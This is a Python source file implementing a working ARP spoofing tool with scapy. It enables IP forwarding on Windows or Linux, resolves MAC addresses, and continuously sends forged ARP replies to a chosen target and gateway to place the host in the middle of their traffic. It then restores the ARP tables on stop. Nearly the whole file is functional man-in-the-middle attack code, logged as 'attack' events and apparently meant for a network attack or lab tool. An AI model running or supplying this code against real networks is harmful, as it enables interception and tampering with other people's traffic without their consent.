import time
import threading
import platform
import subprocess
try:
    import winreg
except Exception:
    winreg = None
import importlib
from database import insert_event

try:
    _scapy = importlib.import_module('scapy.all')
    ARP = _scapy.ARP
    send = _scapy.send
    Ether = _scapy.Ether
    get_if_hwaddr = _scapy.get_if_hwaddr
    srp = _scapy.srp
    conf = _scapy.conf
except Exception:
    ARP = send = Ether = get_if_hwaddr = srp = conf = None

class ARPSpoofer:
    def __init__(self):
        self.interface = None
        self.target_ip = None
        self.gateway_ip = None
        self.active = False
        self.thread = None
        self.original_macs = {}
        self.last_resolution_logs = []

    def _list_interfaces(self):
        try:
            # Prefer scapy's get_if_list if available
            if '_scapy' in globals() and _scapy:
                try:
                    return _scapy.get_if_list()
                except Exception:
                    pass
            # Fall back to conf.ifaces
            if 'conf' in globals() and conf:
                try:
                    ifaces = getattr(conf, 'ifaces', None)
                    if ifaces:
                        names = []
                        for i in conf.ifaces:
                            try:
                                names.append(i.name)
                            except Exception:
                                continue
                        return names
                except Exception:
                    pass
        except Exception:
            return ["error listing interfaces"]
        return []

    def _enable_ip_forwarding(self):
        try:
            if platform.system() == "Windows":
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                     r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                                     0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
                subprocess.run(["netsh", "interface", "ipv4", "set", "global", "forwarding=enabled"],
                               capture_output=True, check=False)
            else:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("1")
            return True
        except Exception as e:
            insert_event("system_error", details=f"Failed to enable IP forwarding: {e}", severity="error")
            return False

    def _disable_ip_forwarding(self):
        try:
            if platform.system() == "Windows":
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                     r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                                     0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 0)
                winreg.CloseKey(key)
                subprocess.run(["netsh", "interface", "ipv4", "set", "global", "forwarding=disabled"],
                               capture_output=True, check=False)
            else:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("0")
            return True
        except Exception as e:
            insert_event("system_error", details=f"Failed to disable IP forwarding: {e}", severity="error")
            return False

    def get_mac(self, ip, retries=15, timeout=3):
        self.last_resolution_logs.append(f"Resolving MAC for {ip} on interface {self.interface}")
        # If Scapy is not available, immediately return None
        if srp is None or Ether is None or ARP is None:
            self.last_resolution_logs.append("Scapy unavailable for ARP resolution")
            insert_event("attack_error", details=f"Scapy not available to resolve MAC for {ip}", severity="error")
            return None

        # prefer explicitly-set interface but fall back to scapy conf
        iface = self.interface
        try:
            if not iface and 'conf' in globals() and conf and getattr(conf, 'iface', None):
                iface = conf.iface
        except Exception:
            iface = self.interface

        for attempt in range(1, retries + 1):
            try:
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                             timeout=timeout, iface=iface, verbose=False)
            except Exception as e:
                self.last_resolution_logs.append(f"ARP send failed on attempt {attempt}: {e}")
                msg = str(e).lower()
                if 'no such device' in msg or 'could not find' in msg or 'iface' in msg:
                    available = self._list_interfaces()
                    details = f"ARP send error: {e}. Available interfaces: {available}"
                    insert_event("attack_error", details=details, severity="error")
                    return None
                if 'permission' in msg or 'operation not permitted' in msg:
                    insert_event("attack_error", details="Permission denied while sending ARP packets. Run as administrator and ensure Npcap is installed.", severity="error")
                    return None
                # otherwise allow retry
                time.sleep(0.5)
                continue

            if not ans:
                self.last_resolution_logs.append(f"No ARP replies on attempt {attempt}")
            else:
                for _, rcv in ans:
                    try:
                        mac = rcv[Ether].src
                        self.last_resolution_logs.append(f"Received reply from {ip}: {mac}")
                        return mac
                    except Exception as e:
                        self.last_resolution_logs.append(f"Failed to parse reply packet: {e}")
                        continue

            backoff = 0.5 + (attempt * 0.2)
            time.sleep(backoff)

        self.last_resolution_logs.append(f"Giving up after {retries} attempts")
        available = self._list_interfaces()
        reason = f"Could not resolve MAC for {ip} on interface {iface}. Last logs: {self.last_resolution_logs[-8:]}. Interfaces: {available}"
        insert_event("attack_error", details=reason, severity="error")
        return None

    def _spoof_loop(self):
        if get_if_hwaddr is None or send is None or ARP is None:
            insert_event("attack_error", details="Scapy not available to perform spoofing loop", severity="error")
            self.active = False
            return

        my_mac = get_if_hwaddr(self.interface)
        while self.active:
            try:
                send(ARP(op=2, pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                         psrc=self.gateway_ip, hwsrc=my_mac),
                     iface=self.interface, verbose=False)
                send(ARP(op=2, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
                         psrc=self.target_ip, hwsrc=my_mac),
                     iface=self.interface, verbose=False)
            except Exception:
                insert_event("attack_error", details="Error sending spoofed ARP packets", severity="error")
                self.active = False
                return
            time.sleep(2)

    def start_spoofing(self, target_ip, gateway_ip, interface):
        if self.active:
            return False, "Spoofer already active"
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip

        if not self._enable_ip_forwarding():
            insert_event("attack_warning", details="IP forwarding not enabled; MITM may not work.", severity="warning")

        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(gateway_ip)
        failed = []
        if not target_mac:
            failed.append(f"target {target_ip}")
        if not gateway_mac:
            failed.append(f"gateway {gateway_ip}")
        if failed:
            reason = "Could not resolve MAC for " + ", ".join(failed) + f" on interface {interface}"
            retry_info = "; ".join(self.last_resolution_logs[-6:])
            if retry_info:
                reason = reason + ". Details: " + retry_info
            insert_event("attack_error", details=reason, severity="error")
            self._disable_ip_forwarding()
            return False, reason

        self.original_macs[target_ip] = target_mac
        self.original_macs[gateway_ip] = gateway_mac

        self.active = True
        self.thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self.thread.start()
        insert_event("attack_start", target_ip=target_ip, source_ip=gateway_ip,
                     details=f"ARP spoofing started between {target_ip} and {gateway_ip} on {interface}",
                     severity="info")
        return True, None

    def stop_spoofing(self):
        if not self.active:
            return False
        self.active = False
        if self.thread:
            self.thread.join(timeout=1)

        if self.target_ip in self.original_macs and self.gateway_ip in self.original_macs:
            if send is None or ARP is None:
                insert_event("attack_warning", details="Scapy not available to restore ARP tables", severity="warning")
            else:
                try:
                    send(ARP(op=2, pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                             psrc=self.gateway_ip, hwsrc=self.original_macs[self.gateway_ip]),
                         iface=self.interface, verbose=False)
                    send(ARP(op=2, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
                             psrc=self.target_ip, hwsrc=self.original_macs[self.target_ip]),
                         iface=self.interface, verbose=False)
                    insert_event("attack_stop", target_ip=self.target_ip, source_ip=self.gateway_ip,
                                 details="ARP spoofing stopped; ARP tables restored", severity="info")
                except Exception:
                    insert_event("attack_warning", details="Failed to send restoration ARP packets", severity="warning")
        self._disable_ip_forwarding()
        self.target_ip = None
        self.gateway_ip = None
        self.interface = None
        return True

spoofer = ARPSpoofer()